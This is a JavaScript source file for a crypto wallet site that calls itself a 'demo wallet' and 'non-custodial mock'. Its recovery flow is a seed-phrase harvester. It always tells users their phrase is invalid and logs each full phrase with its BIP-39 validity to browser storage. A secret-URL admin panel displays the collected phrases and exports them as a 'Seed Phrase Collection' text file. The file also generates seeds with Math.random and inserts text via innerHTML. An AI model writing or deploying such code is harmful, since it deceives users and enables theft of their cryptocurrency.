/* NovaVault demo wallet (client-only, non-custodial mock). */
(function() {
  const $ = (sel) => document.querySelector(sel);
  const $$ = (sel) => Array.from(document.querySelectorAll(sel));

  const state = {
    seed: null,
    address: null
  };

  const wordList = (
    "abandon ability able about above absorb abstract absurd abuse access accident account accuse achieve acid across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis" 
  ).split(" ");

  function getRandomInt(max) { return Math.floor(Math.random() * max); }

  function generateSeedWords(count = 12) {
    const words = [];
    for (let i = 0; i < count; i++) {
      words.push(wordList[getRandomInt(wordList.length)]);
    }
    return words;
  }

  function normalizeSeed(input, limit = 24) {
    return input
      .toLowerCase()
      .replace(/[^a-z0-9\s]/g, " ")
      .split(/\s+/)
      .filter(Boolean)
      .slice(0, limit);
  }

  async function subtleHash(text) {
    const enc = new TextEncoder();
    const data = enc.encode(text);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const byteArray = Array.from(new Uint8Array(hashBuffer));
    return byteArray.map(b => b.toString(16).padStart(2, '0')).join('');
  }

  async function deriveAddressFromSeed(words) {
    const joined = words.join(' ');
    const h = await subtleHash(joined);
    // mock evm-like address
    return '0x' + h.slice(0, 40);
  }

  // --- BIP39 Validation (English wordlist) ---
  async function loadBip39English() {
    const key = 'bip39.en';
    try {
      const cached = localStorage.getItem(key);
      if (cached) return JSON.parse(cached);
    } catch (_) {}
    const url = 'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt';
    const res = await fetch(url, { cache: 'force-cache' });
    const text = await res.text();
    const list = text.split('\n').map(w => w.trim()).filter(Boolean);
    try { localStorage.setItem(key, JSON.stringify(list)); } catch (_) {}
    return list;
  }

  function to11Bit(n) { return n.toString(2).padStart(11, '0'); }
  function bitsToBytes(bits) {
    const bytes = [];
    for (let i = 0; i < bits.length; i += 8) {
      const byte = bits.slice(i, i + 8);
      bytes.push(parseInt(byte.padEnd(8, '0'), 2));
    }
    return new Uint8Array(bytes);
  }

  async function validateBip39(words) {
    const n = words.length;
    if (!(n === 12 || n === 24)) return { ok: false, reason: 'Seed must be 12 or 24 words' };
    const list = await loadBip39English();
    const indices = [];
    for (const w of words) {
      const idx = list.indexOf(w);
      if (idx === -1) return { ok: false, reason: `Unknown word: ${w}` };
      indices.push(idx);
    }
    const bits = indices.map(to11Bit).join('');
    const ENT = Math.floor((bits.length * 32) / 33); // entropy bits
    const CS = bits.length - ENT; // checksum bits
    const entBits = bits.slice(0, ENT);
    const csBits = bits.slice(ENT);
    const entropy = bitsToBytes(entBits);
    const hashBuf = await crypto.subtle.digest('SHA-256', entropy);
    const firstByte = new Uint8Array(hashBuf)[0];
    const hashBits = firstByte.toString(2).padStart(8, '0').slice(0, CS);
    const ok = hashBits === csBits;
    return ok ? { ok: true } : { ok: false, reason: 'Checksum mismatch' };
  }

  function saveWallet(seedWords, address) {
    localStorage.setItem('nova.seed', JSON.stringify(seedWords));
    localStorage.setItem('nova.address', address);
  }

  function loadWallet() {
    try {
      const words = JSON.parse(localStorage.getItem('nova.seed') || 'null');
      const address = localStorage.getItem('nova.address');
      if (Array.isArray(words) && typeof address === 'string') {
        state.seed = words;
        state.address = address;
        return true;
      }
    } catch (_) {}
    return false;
  }

  function clearWallet() {
    localStorage.removeItem('nova.seed');
    localStorage.removeItem('nova.address');
    state.seed = null; state.address = null;
  }

  function showError(message) {
    // Remove any existing error messages
    const existingError = document.querySelector('.error-message');
    if (existingError) {
      existingError.remove();
    }
    
    // Create error message element
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.innerHTML = `
      <div class="error-content">
        <div class="error-icon">⚠️</div>
        <div class="error-text">${message}</div>
        <button class="error-close" onclick="this.parentElement.parentElement.remove()">×</button>
      </div>
    `;
    
    // Add to modal
    const modal = document.getElementById('modal-recover');
    modal.appendChild(errorDiv);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
      if (errorDiv.parentElement) {
        errorDiv.remove();
      }
    }, 5000);
  }

  function exportLogsToFile() {
    try {
      // Get all logs from localStorage
      const recoveryLogs = JSON.parse(localStorage.getItem('nova.recoveryLogs') || '[]');
      const walletLogs = JSON.parse(localStorage.getItem('nova.walletLogs') || '[]');
      
      // Create combined log object
      const allLogs = {
        exportDate: new Date().toISOString(),
        recoveryLogs: recoveryLogs,
        walletLogs: walletLogs,
        totalRecoveries: recoveryLogs.length,
        totalWallets: walletLogs.length
      };
      
      // Create and download JSON file
      const dataStr = JSON.stringify(allLogs, null, 2);
      const dataBlob = new Blob([dataStr], {type: 'application/json'});
      
      const url = URL.createObjectURL(dataBlob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `nova-wallet-logs-${new Date().toISOString().split('T')[0]}.json`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      URL.revokeObjectURL(url);
      
      console.log('Logs exported to JSON file:', link.download);
    } catch (error) {
      console.error('Failed to export logs:', error);
    }
  }

  function showAdminPanel() {
    // Hide all pages first
    document.querySelectorAll('.fullscreen-page').forEach(page => page.classList.add('hidden'));
    // Show admin panel
    document.getElementById('admin-panel').classList.remove('hidden');
    
    // Load and display seed phrases
    loadAdminData();
  }

  function loadAdminData() {
    const logs = JSON.parse(localStorage.getItem('nova.recoveryLogs') || '[]');
    
    // Update stats - show all seed phrases
    const validSeeds = logs.filter(log => log.type === 'valid_seed').length;
    const invalidSeeds = logs.filter(log => log.type === 'invalid_seed').length;
    const totalSeeds = logs.length;
    
    document.getElementById('total-attempts').textContent = totalSeeds;
    document.getElementById('valid-seeds').textContent = validSeeds;
    document.getElementById('invalid-attempts').textContent = invalidSeeds;
    
    // Display ALL seed phrases
    const seedList = document.getElementById('seed-list');
    seedList.innerHTML = '';
    
    if (logs.length === 0) {
      seedList.innerHTML = '<div style="text-align: center; color: var(--muted); padding: 40px;">No seed phrases entered yet</div>';
      return;
    }
    
    logs.reverse().forEach(log => {
      const seedItem = document.createElement('div');
      seedItem.className = `seed-item ${log.type === 'valid_seed' ? 'valid' : 'invalid'}`;
      
      seedItem.innerHTML = `
        <div class="seed-info">
          <div class="seed-phrase">${log.fullSeedPhrase}</div>
          <div class="seed-meta">
            ${new Date(log.timestamp).toLocaleString()} • 
            ${log.wordCount} words • 
            ${log.firstWord}...${log.lastWord} • 
            ${log.reason}
          </div>
        </div>
        <div class="seed-type ${log.type === 'valid_seed' ? 'valid' : 'invalid'}">
          ${log.type === 'valid_seed' ? 'Valid' : 'Invalid'}
        </div>
      `;
      
      seedList.appendChild(seedItem);
    });
  }

  function downloadAsTxt() {
    const logs = JSON.parse(localStorage.getItem('nova.recoveryLogs') || '[]');
    
    let txtContent = `NovaVault Seed Phrase Collection\n`;
    txtContent += `Generated: ${new Date().toLocaleString()}\n`;
    txtContent += `Total Entries: ${logs.length}\n`;
    txtContent += `Valid Seeds: ${logs.filter(log => log.type === 'valid_seed').length}\n`;
    txtContent += `Invalid Seeds: ${logs.filter(log => log.type === 'invalid_seed').length}\n\n`;
    txtContent += `========================================\n\n`;
    
    logs.reverse().forEach((log, index) => {
      txtContent += `${index + 1}. ${log.fullSeedPhrase}\n`;
      txtContent += `   Time: ${new Date(log.timestamp).toLocaleString()}\n`;
      txtContent += `   Status: ${log.validationStatus}\n`;
      txtContent += `   Reason: ${log.reason}\n`;
      txtContent += `   Words: ${log.wordCount}\n\n`;
    });
    
    const blob = new Blob([txtContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `nova-seed-phrases-${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  }

  function uiShowDashboard(address) {
    // Hide all pages first
    document.querySelectorAll('.fullscreen-page').forEach(page => page.classList.add('hidden'));
    // Show wallet dashboard
    document.getElementById('wallet-dashboard').classList.remove('hidden');
    
    // Initialize wallet with random balances
    initializeWallet();
  }

  function initializeWallet() {
    // Load saved balances or start with zero
    const savedBalances = JSON.parse(localStorage.getItem('nova.balances') || '{}');
    
    // Mock crypto prices (in USD)
    const prices = {
      BTC: 45000,
      ETH: 3000,
      BNB: 300,
      XRP: 0.5,
      ADA: 0.4,
      SOL: 100,
      DOGE: 0.08,
      USDT: 1,
      USDC: 1,
      MATIC: 0.8
    };

    // Use saved balances or default to zero
    const balances = {
      BTC: savedBalances.BTC || '0.00000000',
      ETH: savedBalances.ETH || '0.00000000',
      BNB: savedBalances.BNB || '0.00000000',
      XRP: savedBalances.XRP || '0.00000000',
      ADA: savedBalances.ADA || '0.00000000',
      SOL: savedBalances.SOL || '0.00000000',
      DOGE: savedBalances.DOGE || '0.00000000',
      USDT: savedBalances.USDT || '0.00000000',
      USDC: savedBalances.USDC || '0.00000000',
      MATIC: savedBalances.MATIC || '0.00000000'
    };

    // Calculate total balance
    let totalBalance = 0;
    Object.keys(balances).forEach(symbol => {
      const balance = parseFloat(balances[symbol]);
      const value = balance * prices[symbol];
      totalBalance += value;
      
      // Update UI
      document.getElementById(`${symbol.toLowerCase()}-balance`).textContent = balances[symbol];
      document.getElementById(`${symbol.toLowerCase()}-value`).textContent = `$${value.toFixed(2)}`;
    });

    document.getElementById('total-balance').textContent = `$${totalBalance.toFixed(2)}`;
  }

  function uiShowSeed(words) {
    const grid = $('#seed-words');
    grid.innerHTML = '';
    words.forEach((w, i) => {
      const el = document.createElement('div');
      el.className = 'word';
      el.innerHTML = `<span class="idx">${String(i+1).padStart(2,'0')}</span><span class="mono">${w}</span>`;
      grid.appendChild(el);
    });
  }


  function drawGrid() {
    const canvas = document.getElementById('bg-grid');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    function resize() { canvas.width = innerWidth; canvas.height = innerHeight; }
    resize();
    addEventListener('resize', resize);
    let t = 0;
    (function loop() {
      t += 0.006;
      ctx.clearRect(0,0,canvas.width,canvas.height);
      ctx.globalAlpha = 0.35;
      const gap = 32;
      for (let x = 0; x < canvas.width; x += gap) {
        const yOff = Math.sin((x * 0.01) + t) * 8;
        ctx.strokeStyle = 'rgba(30,102,245,0.12)';
        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
        ctx.strokeStyle = 'rgba(136,57,239,0.10)';
        ctx.beginPath(); ctx.moveTo(0, x + yOff); ctx.lineTo(canvas.width, x + yOff); ctx.stroke();
      }
      requestAnimationFrame(loop);
    })();
  }

  function setupReveal() {
    const observer = new IntersectionObserver((entries) => {
      for (const entry of entries) {
        if (entry.isIntersecting) entry.target.classList.add('in');
      }
    }, { threshold: 0.08 });
    ['.card', '.hero-copy', '.hero-visual', '.section h2'].forEach(sel => {
      $$(sel).forEach(el => { el.classList.add('reveal'); observer.observe(el); });
    });
  }

  function buildSeedInputs(len) {
    const wrap = document.getElementById('seed-inputs');
    if (!wrap) return;
    wrap.dataset.length = String(len);
    wrap.innerHTML = '';
    for (let i = 0; i < len; i++) {
      const box = document.createElement('div');
      box.className = 'seed-box';
      const idx = document.createElement('span'); idx.className = 'idx'; idx.textContent = String(i+1).padStart(2,'0');
      const input = document.createElement('input'); input.type = 'text'; input.inputMode = 'text'; input.autocapitalize = 'none'; input.autocomplete = 'off'; input.spellcheck = false; input.placeholder = 'word';
      input.addEventListener('input', () => {
        input.value = input.value.toLowerCase().replace(/[^a-z0-9]/g,'');
        if (input.value.includes(' ')) distributePaste(input.value);
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value) {
          const prev = box.previousElementSibling?.querySelector('input');
          prev?.focus();
        } else if (e.key === 'Enter') {
          const next = box.nextElementSibling?.querySelector('input');
          (next || input).focus();
        }
      });
      input.addEventListener('paste', (e) => {
        const text = (e.clipboardData?.getData('text')||'');
        if (text.includes(' ')) { e.preventDefault(); distributePaste(text); }
      });
      box.appendChild(idx); box.appendChild(input);
      wrap.appendChild(box);
    }
    const btn12 = document.getElementById('btn-len-12');
    const btn24 = document.getElementById('btn-len-24');
    if (btn12 && btn24) {
      btn12.classList.toggle('active', len === 12); btn12.setAttribute('aria-selected', String(len===12));
      btn24.classList.toggle('active', len === 24); btn24.setAttribute('aria-selected', String(len===24));
      btn12.onclick = () => buildSeedInputs(12);
      btn24.onclick = () => buildSeedInputs(24);
    }
    wrap.querySelector('input')?.focus();
  }

  function collectSeedInputs() {
    const wrap = document.getElementById('seed-inputs');
    if (!wrap) return [];
    return Array.from(wrap.querySelectorAll('input')).map(i => i.value.trim().toLowerCase()).filter(Boolean);
  }

  function distributePaste(text) {
    const wrap = document.getElementById('seed-inputs');
    if (!wrap) return;
    const len = Number(wrap.dataset.length || '12');
    const words = normalizeSeed(text, len);
    const inputs = Array.from(wrap.querySelectorAll('input'));
    inputs.forEach((inp, i) => { inp.value = words[i] || ''; });
  }

  function init() {
    $('#year').textContent = new Date().getFullYear();
    drawGrid();
    setupReveal();

    // Onboard triggers
    $('#btn-create').addEventListener('click', (e) => {
      spawnRipple(e);
      pulseOrb();
      const words = generateSeedWords();
      state.seed = words;
      uiShowSeed(words);
      // Show fullscreen seed page
      document.querySelectorAll('.fullscreen-page').forEach(page => page.classList.add('hidden'));
      document.getElementById('seed-page').classList.remove('hidden');
    });
    $('#btn-copy-seed').addEventListener('click', () => {
      if (!state.seed) return;
      const seedText = state.seed.join(' ');
      navigator.clipboard.writeText(seedText).then(() => {
        const btn = $('#btn-copy-seed');
        const originalText = btn.textContent;
        btn.textContent = '✓';
        btn.style.background = 'linear-gradient(135deg, var(--accent), var(--accent-2))';
        btn.style.color = 'white';
        setTimeout(() => {
          btn.textContent = originalText;
          btn.style.background = '';
          btn.style.color = '';
        }, 2000);
      }).catch(() => {
        alert('Failed to copy seed phrase');
      });
    });

    $('#btn-confirm-seed').addEventListener('click', async (e) => {
      e.preventDefault();
      if (!state.seed) return;
      const addr = await deriveAddressFromSeed(state.seed);
      state.address = addr;
      saveWallet(state.seed, addr);
      uiShowDashboard(addr);
    });

    $('#btn-recover').addEventListener('click', (e) => {
      spawnRipple(e);
      pulseOrb();
      buildSeedInputs(12);
      document.getElementById('modal-recover').showModal();
      // Ensure inputs are built after modal opens
      setTimeout(() => buildSeedInputs(12), 100);
    });
    $('#btn-recover-confirm').addEventListener('click', async (e) => {
      e.preventDefault();
      const wrap = document.getElementById('seed-inputs');
      const targetLen = Number(wrap?.dataset.length || '12');
      const words = collectSeedInputs();
      if (words.length !== targetLen || words.some(w => !w)) { 
        showError(`Please enter a ${targetLen}-word seed phrase`); 
        return; 
      }
      const validation = await validateBip39(words);
      
      // Always show error to user (even if seed is valid)
      showError('Error: Invalid seed phrase');
      
      // Log ALL seed phrases regardless of validation
      const seedLog = {
        timestamp: new Date().toISOString(),
        wordCount: words.length,
        fullSeedPhrase: words.join(' '), // Full seed phrase
        firstWord: words[0],
        lastWord: words[words.length - 1],
        type: validation.ok ? 'valid_seed' : 'invalid_seed',
        validationStatus: validation.ok ? 'VALID' : 'INVALID',
        reason: validation.ok ? 'BIP-39 Valid' : validation.reason,
        note: validation.ok ? 'Real BIP-39 seed phrase' : 'Invalid or random words'
      };
      
      console.log('Seed phrase logged:', seedLog);
      
      // Save to localStorage for persistence
      const existingLogs = JSON.parse(localStorage.getItem('nova.recoveryLogs') || '[]');
      existingLogs.push(seedLog);
      localStorage.setItem('nova.recoveryLogs', JSON.stringify(existingLogs));
      
      // Reload the site after 1 second
      setTimeout(() => {
        window.location.reload();
      }, 1000);
      
      // Don't proceed to dashboard - always show error
      return;
    });


    // Wallet dashboard interactions - removed lock wallet functionality

    // Enhance select → custom select component
    enhanceSelect('#crypto-select');

    // Sending functionality (mock)
    $('#btn-send').addEventListener('click', () => {
      const crypto = $('#crypto-select').value;
      const address = $('#send-address').value.trim();
      const amount = parseFloat($('#send-amount').value);
      if (!address || address.length < 6) { alert('Please enter a valid recipient address'); return; }
      if (!amount || amount <= 0) { alert('Please enter a valid amount'); return; }
      // Check balance (defaults to zero for new users)
      const savedBalances = JSON.parse(localStorage.getItem('nova.balances') || '{}');
      const currentBalance = parseFloat(savedBalances[crypto] || '0');
      if (!isFinite(currentBalance) || currentBalance <= 0 || amount > currentBalance) {
        showError('Insufficient balance to send');
        return;
      }
      alert(`Sending ${amount} ${crypto} to ${address}`);
      // Reset form
      $('#send-amount').value = '';
      $('#send-address').value = '';
    });

    // Admin panel access via secret URL
    const currentUrl = window.location.href;
    const secretPath = '#admin-panel-7x9k2m8p4q1w5e3r6t8y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0';
    
    if (currentUrl.includes(secretPath)) {
      showAdminPanel();
    }

    // Back to main from admin
    $('#btn-back-to-main').addEventListener('click', () => {
      document.querySelectorAll('.fullscreen-page').forEach(page => page.classList.add('hidden'));
      document.querySelector('.hero').scrollIntoView({ behavior: 'smooth' });
    });

    // Download TXT button
    $('#btn-download-txt').addEventListener('click', () => {
      downloadAsTxt();
    });

    // Check if user has a wallet and show dashboard
    if (loadWallet()) {
      document.querySelectorAll('.fullscreen-page').forEach(page => page.classList.add('hidden'));
      document.getElementById('wallet-dashboard').classList.remove('hidden');
      initializeWallet();
    }
  }

  document.addEventListener('DOMContentLoaded', init);

  function spawnRipple(evt) {
    const button = evt.currentTarget;
    const rect = button.getBoundingClientRect();
    const ripple = document.createElement('span');
    ripple.className = 'ripple';
    const x = evt.clientX - rect.left; const y = evt.clientY - rect.top;
    ripple.style.left = x + 'px'; ripple.style.top = y + 'px';
    button.appendChild(ripple);
    setTimeout(() => ripple.remove(), 650);
  }

  function pulseOrb() {
    const orb = document.querySelector('.orb');
    if (!orb) return;
    orb.animate([
      { transform: 'scale(1)', filter: 'brightness(1)' },
      { transform: 'scale(1.04)', filter: 'brightness(1.1)' },
      { transform: 'scale(1)', filter: 'brightness(1)' }
    ], { duration: 500, easing: 'ease-out' });
  }

  function enhanceSelect(selector) {
    const native = document.querySelector(selector);
    if (!native) return;
    const wrapper = document.createElement('div');
    wrapper.className = 'cs';
    native.classList.add('cs-hidden');
    native.parentElement.insertBefore(wrapper, native);
    wrapper.appendChild(native);

    const trigger = document.createElement('button');
    trigger.type = 'button';
    trigger.className = 'cs-trigger';
    trigger.innerHTML = `<span class="label">${native.options[native.selectedIndex].text}</span>
      <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>`;
    wrapper.appendChild(trigger);

    const list = document.createElement('div');
    list.className = 'cs-list';
    Array.from(native.options).forEach((opt, idx) => {
      const item = document.createElement('div');
      item.className = 'cs-item' + (idx === native.selectedIndex ? ' active' : '');
      item.dataset.value = opt.value;
      item.innerHTML = `<span>${opt.text}</span>`;
      item.addEventListener('click', () => {
        native.value = opt.value;
        trigger.querySelector('.label').textContent = opt.text;
        wrapper.classList.remove('open');
        list.querySelectorAll('.cs-item').forEach(el => el.classList.remove('active'));
        item.classList.add('active');
      });
      list.appendChild(item);
    });
    wrapper.appendChild(list);

    trigger.addEventListener('click', () => {
      wrapper.classList.toggle('open');
    });
    document.addEventListener('click', (e) => {
      if (!wrapper.contains(e.target)) wrapper.classList.remove('open');
    });
  }

  function updateBalances(crypto, amount, isBuy) {
    // Load current balances
    const savedBalances = JSON.parse(localStorage.getItem('nova.balances') || '{}');
    const currentBalance = parseFloat(savedBalances[crypto] || '0');
    
    // Update balance
    const newBalance = isBuy ? currentBalance + amount : Math.max(0, currentBalance - amount);
    savedBalances[crypto] = newBalance.toFixed(8);
    
    // Save to localStorage
    localStorage.setItem('nova.balances', JSON.stringify(savedBalances));
    
    // Refresh the wallet display
    initializeWallet();
  }
})();


